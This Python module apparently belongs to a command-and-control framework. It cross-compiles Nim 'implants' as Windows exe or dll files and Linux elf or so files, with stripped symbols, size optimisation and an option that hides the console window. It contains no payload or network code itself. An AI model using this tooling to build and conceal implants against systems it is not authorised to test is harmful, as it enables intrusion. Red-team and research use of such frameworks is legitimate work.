import asyncio
import os
import shutil
from pathlib import Path

from infra.general.create_log import logger, write_log
from launcher.utils.config import config as server_config
from ...sandbox import create_syntax_for_sandbox_build
from .paths import project
from . import prep as ph


windows_arch = {
    "x64": ("amd64", "x86_64-w64-mingw32-gcc"),
    "x86": ("i386", "i686-w64-mingw32-gcc"),
}

linux_arch = {
    ("amd", "x64"): ("amd64", "gcc", None),
    ("amd", "x86"): ("i386", "gcc", None),
    ("arm", "x64"): (
        "arm64",
        "aarch64-linux-gnu-gcc",
        "sudo apt install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu",
    ),
}

gcc_env = {
    "aarch64-linux-gnu-gcc": "AARCH64_LINUX_GNU_GCC",
    "x86_64-w64-mingw32-gcc": "MINGW64_GCC",
    "i686-w64-mingw32-gcc": "MINGW32_GCC",
}

output_names = {
    "so": "main.so",
    "elf": "main",
    "dll": "main.dll",
}


def resolve_gcc(name):
    # Finds a gcc binary
    env_key = gcc_env.get(name)
    if env_key:
        env_bin = os.environ.get(env_key, "").strip()
        if env_bin and os.path.isfile(env_bin) and os.access(env_bin, os.X_OK):
            return env_bin

    found = shutil.which(name)
    if found:
        return found

    candidate = Path("/usr/bin") / name
    if candidate.is_file() and os.access(candidate, os.X_OK):
        return str(candidate)

    return None


def gcc_ar(gcc):
    # Builds the ar name from the gcc name
    name = Path(gcc).name
    if name == "gcc":
        return "ar"
    if name.endswith("-gcc"):
        return name[:-4] + "-ar"
    return f"{name}-ar"


def resolve_ar(gcc, install_hint=None):
    # Finds the ar binary that matches gcc
    gcc_path = Path(gcc)
    if gcc_path.name.endswith("-gcc"):
        candidate = gcc_path.with_name(gcc_path.name[:-4] + "-ar")
        if candidate.is_file() and os.access(candidate, os.X_OK):
            return str(candidate)
    if gcc_path.name == "gcc":
        found = shutil.which("ar")
        if found:
            return found
    return require_gcc(gcc_ar(gcc), install_hint)


def require_gcc(name, install_hint=None):
    # Finds gcc or raises when it is missing
    resolved = resolve_gcc(name)
    if resolved:
        return resolved

    hint = install_hint or f"install {name} and ensure it is on PATH"
    raise FileNotFoundError(f"{name} not found; {hint}")


def nim_bin():
    # Finds the nim compiler
    if server_config.get("compiler", {}).get("sandbox"):
        toolchains = Path.home() / ".choosenim" / "toolchains"
        if toolchains.is_dir():
            for candidate in sorted(
                toolchains.glob("*/bin/nim"),
                key=lambda p: p.stat().st_mtime,
                reverse=True,
            ):
                if candidate.is_file() and os.access(candidate, os.X_OK):
                    return str(candidate.resolve())

    found = shutil.which("nim")
    if found:
        return found

    for candidate in (
        Path.home() / ".nimble" / "bin" / "nim",
        Path("/usr/bin/nim"),
    ):
        if candidate.is_file() and os.access(candidate, os.X_OK):
            return str(candidate)

    return None


def format_build_output(stdout, stderr, fallback="Build failed") -> str:
    # Joins the build stdout and stderr
    err = stderr.strip()
    out = stdout.strip()
    parts = []
    if err:
        parts.append(err)
    if out and out != err:
        parts.append(out)
    return "\n\n".join(parts) if parts else fallback


def output_path(path, fmt):
    # Builds the output path for the format
    return os.path.join(path, output_names.get(fmt, "main.exe"))


async def nim_args(config, path, extra=None, icon_obj=None):
    # Builds the nim compile command
    arch = config.get("arch", "x64")
    cpu = config.get("cpu", "amd")
    os_name = str(config.get("operational_system", "windows")).strip().lower()
    fmt = config.get("format", "exe")

    if os_name == "macos":
        raise RuntimeError("macOS implants use the Go compiler (format=app)")

    nim_os_name = os_name

    if os_name == "linux":
        key = (cpu, arch)
        if key not in linux_arch:
            raise RuntimeError(f"unsupported linux target: cpu={cpu} arch={arch}")
        cpu_name, gcc, install_hint = linux_arch[key]
        gcc = require_gcc(gcc, install_hint)
        ar = resolve_ar(gcc, install_hint)
    else:
        cpu_name, gcc = windows_arch.get(arch, windows_arch["x64"])
        gcc = require_gcc(gcc)
        ar = resolve_ar(gcc)

    nim = nim_bin()
    if not nim:
        raise FileNotFoundError(
            "nim compiler not found; install nim"
        )

    args = [
        nim, "c",
        f"--os:{nim_os_name}",
        f"--cpu:{cpu_name}",
        f"--gcc.exe:{gcc}",
        f"--gcc.linkerexe:{gcc}",
        f"--gcc.ar:{ar}",
        f"--nimcache:{os.path.join(path, 'nimcache')}",
        "-d:release",
        "--opt:size",
        "--mm:orc",
        "--threads:on",
        "-d:strip",
        "--debuginfo:off",
        "--stackTrace:off",
        "--lineTrace:off",
        "--hints:on",
        "--warnings:on",
        "--warningAsError:UnusedImport:off",
        "--warningAsError:Deprecated:off",
        "--passC=-g0",
        "--passC=-ffunction-sections",
        "--passC=-fdata-sections",
    ]

    norm_path = path.replace("\\", "/")
    if os_name == "linux":
        args.append("-d:ssl")

    if os_name == "windows":
        args += ["-d:lto", "--passL=-Wl,-s", "--passL=-Wl,--gc-sections"]
        if icon_obj:
            args.append(f"--passL:{os.path.abspath(icon_obj)}")
    else:
        args.append("--passL=-s")

    artifact = output_path(path, fmt)
    args.append(f"-o:{artifact}")

    if fmt in ("dll", "so"):
        args.append("--app:lib")
        if os_name == "windows":
            args.append("-d:dllsafe")
    elif (
        os_name == "windows"
        and fmt == "exe"
        and str(config.get("show_conhost", "off")).strip().lower() != "on"
    ):
        args.append("--app:gui")

    args.append("main.nim")

    if extra:
        args.extend(extra)

    return args


async def build(config, body, path=None, icon_obj=None):
    # Compiles the nim implant
    path = ph.tmpdir or path or await project(body)
    try:
        args = await nim_args(config, path, icon_obj=icon_obj)
    except (FileNotFoundError, RuntimeError) as exc:
        write_log(logger, "error", f"Unhandled exception | implants/nim/build | {exc}")
        msg = str(exc)
        return {
            "status": "failure",
            "message": msg,
            "stdout": "",
            "stderr": msg,
        }

    if server_config.get("compiler", {}).get("sandbox"):
        args = create_syntax_for_sandbox_build(args, path)

    proc = await asyncio.create_subprocess_exec(
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=path,
    )

    out, err = await proc.communicate()
    stdout = out.decode(errors="replace")
    stderr = err.decode(errors="replace")

    if proc.returncode:
        return {
            "status": "failure",
            "message": format_build_output(stdout, stderr),
            "stdout": stdout,
            "stderr": stderr,
        }

    return {
        "path": output_path(path, config.get("format", "exe")),
        "stdout": stdout,
        "stderr": stderr,
    }


async def exe(config, tag, body, icon_obj=None, path=None):
    # Compiles an exe implant
    return await build(config, body, path, icon_obj=icon_obj)


async def dll(config, tag, body, path=None):
    # Compiles a dll implant
    return await build(config, body, path)


async def elf(config, tag, body, path=None):
    # Compiles an elf implant
    return await build(config, body, path)


async def so(config, tag, body, path=None):
    # Compiles a shared object implant
    return await build(config, body, path)
